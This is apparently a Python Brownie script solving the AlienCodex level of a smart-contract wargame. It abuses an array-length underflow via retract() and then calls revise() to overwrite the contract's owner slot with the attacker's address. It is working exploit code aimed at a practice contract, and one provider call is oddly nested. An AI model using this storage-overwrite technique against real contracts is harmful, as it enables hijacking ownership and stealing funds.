from brownie import Contract, AlienCodex, Attack, network, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():

    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

        codex = AlienCodex.deploy({"from": get_account(index=1)})

        attack = Attack.deploy({"from": account})

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                Web3.HTTPProvider(config["networks"][network.show_active()]["infura"])
            )
        )

        codex = Contract.from_abi(
            AlienCodex._name,
            config["networks"][network.show_active()]["codex"],
            AlienCodex.abi,
        )

        attack = Attack.deploy({"from": account})

    attack.getIndex().wait(1)

    codex.make_contact({"from": account}).wait(1)
    codex.retract({"from": account}).wait(1)
    codex.revise(
        attack.index(),
        "0x000000000000000000000000" + str(account)[2:],
        {"from": account},
    ).wait(1)

    print(f"Codex owner is {codex.owner()}")


def main():
    attack()
